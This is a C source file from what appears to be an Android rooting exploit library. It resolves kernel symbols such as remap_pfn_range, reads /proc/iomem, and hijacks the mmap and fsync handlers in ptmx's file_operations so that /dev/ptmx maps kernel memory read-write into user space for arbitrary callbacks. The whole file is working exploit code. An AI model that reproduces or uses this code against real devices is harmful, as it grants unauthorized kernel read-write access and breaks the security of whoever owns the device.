#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "kallsyms.h"
#include "mm.h"
#include "ptmx.h"
#include "libexploit/exploit.h"
#include "device_database/device_database.h"

#define PAGE_OFFSET     0xc0000000
#define KERNEL_SIZE     0x02000000


static unsigned long int kernel_phys_offset;

int (*remap_pfn_range)(struct vm_area_struct *, unsigned long addr,
                       unsigned long pfn, unsigned long size, pgprot_t);

bool
setup_remap_pfn_range_address(void)
{
  if (remap_pfn_range) {
    return true;
  }

  remap_pfn_range = (void *)device_get_symbol_address(DEVICE_SYMBOL(remap_pfn_range));

  if (!remap_pfn_range && kallsyms_exist()) {
    remap_pfn_range = kallsyms_get_symbol_address("remap_pfn_range");
  }

  return !!remap_pfn_range;
}

void
set_kernel_phys_offset(unsigned long int offset)
{
  kernel_phys_offset = offset;
}

#define PAGE_SHIFT  12

void *
convert_to_kernel_address(void *address, void *mmap_base_address)
{
  return address - mmap_base_address + (void*)PAGE_OFFSET;
}

void *
convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (address - (void*)PAGE_OFFSET);
}

static bool
detect_kernel_phys_parameters(void)
{
  FILE *fp;
  void *system_ram_address;
  char name[BUFSIZ];
  void *start_address, *end_address;
  int ret;

  system_ram_address = NULL;

  fp = fopen("/proc/iomem", "r");
  if (!fp) {
    printf("Failed to open /proc/iomem due to %s.\n", strerror(errno));
    return false;
  }

  while ((ret = fscanf(fp, "%p-%p : %[^\n]", &start_address, &end_address, name)) != EOF) {
    if (!strcmp(name, "System RAM")) {
      system_ram_address = start_address;
      continue;
    }
    if (!strncmp(name, "Kernel", 6)) {
      break;
    }
  }
  fclose(fp);

  set_kernel_phys_offset((int)system_ram_address);

  return true;
}

static void *old_mmap_handler;

int
ptmx_mmap(struct file *filep, struct vm_area_struct *vma)
{
  void **p;
  int ret;

  p = (void **)ptmx_fops_mmap_address;

  ret = remap_pfn_range(vma, vma->vm_start,
                            kernel_phys_offset >> PAGE_SHIFT,
                            vma->vm_end - vma->vm_start, vma->vm_page_prot);

  if (p) {
    *p = old_mmap_handler;
  }

  return ret;
}

static void
setup_mmap_by_fsync(void)
{
  void **p;

  p = (void **)ptmx_fops_mmap_address;
  if (p) {
    old_mmap_handler = *p;
    *p = (void *)&ptmx_mmap;
  }
}

static bool
run_callback_with_fsync_and_mmap(void *user_data)
{
  int fd;
  void *address;
  void *start_address = (void *)0x20000000;
  memory_callback_t callback = (memory_callback_t)user_data;
  bool ret;

  fd = open(PTMX_DEVICE, O_RDWR);
  fsync(fd);

  address = mmap(start_address, KERNEL_SIZE,
                 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                 fd, 0);
  if (address == MAP_FAILED) {
    printf("Failed to mmap /dev/ptmx due to %s.\n", strerror(errno));
    close(fd);
    return false;
  }

  ret = callback(address, KERNEL_SIZE);

  munmap(address, KERNEL_SIZE);

  close(fd);

  return ret;
}

typedef struct _callback_memory_exploit_info_t {
  memory_callback_t func;
  bool result;
} callback_memory_exploit_info_t;

static bool
run_callback_memory_exploit(void *address, size_t length, void *param)
{
  callback_memory_exploit_info_t *info = param;

  info->result = info->func(address, length);

  return true;
}

static bool
run_exploit_mmap(memory_callback_t callback, bool *result)
{
  callback_memory_exploit_info_t info;

  info.func = callback;

  if (attempt_mmap_exploit(&run_callback_memory_exploit, &info)) {
    *result = info.result;
    return true;
  }

  return false;
}

bool
run_with_mmap(memory_callback_t callback)
{
  unsigned long int kernel_physical_offset;
  bool result;

  if (run_exploit_mmap(callback, &result)) {
    return result;
  }

  setup_remap_pfn_range_address();

  if (!remap_pfn_range) {
    printf("You need to manage to get remap_pfn_range address.\n");
    return false;
  }

  setup_ptmx_fops_fsync_address();
  if (!ptmx_fops_fsync_address) {
    printf("You need to manage to get ptmx_fops address.\n");
    return false;
  }

  setup_ptmx_fops_mmap_address();
  if (!ptmx_fops_mmap_address) {
    printf("You need to manage to get ptmx_fops address.\n");
    return false;
  }

  kernel_physical_offset = device_get_symbol_address(DEVICE_SYMBOL(kernel_physical_offset));
  if (kernel_physical_offset) {
    set_kernel_phys_offset(kernel_physical_offset - 0x00008000);
  }
  else if (!detect_kernel_phys_parameters()) {
    printf("You need to manage to get kernel_physical_offset address.\n");
    return false;
  }

  return attempt_exploit(ptmx_fops_fsync_address,
                         (unsigned long int)&setup_mmap_by_fsync, 0,
                         run_callback_with_fsync_and_mmap, callback);
}

static bool
run_exploit_memcpy(memory_callback_t callback, bool *result)
{
  callback_memory_exploit_info_t info;

  info.func = callback;

  if (attempt_memcpy_exploit(&run_callback_memory_exploit, &info)) {
    *result = info.result;
    return true;
  }

  return false;
}

bool
run_with_memcpy(memory_callback_t callback)
{
  bool result;

  if (run_exploit_memcpy(callback, &result)) {
    return result;
  }

  return false;
}
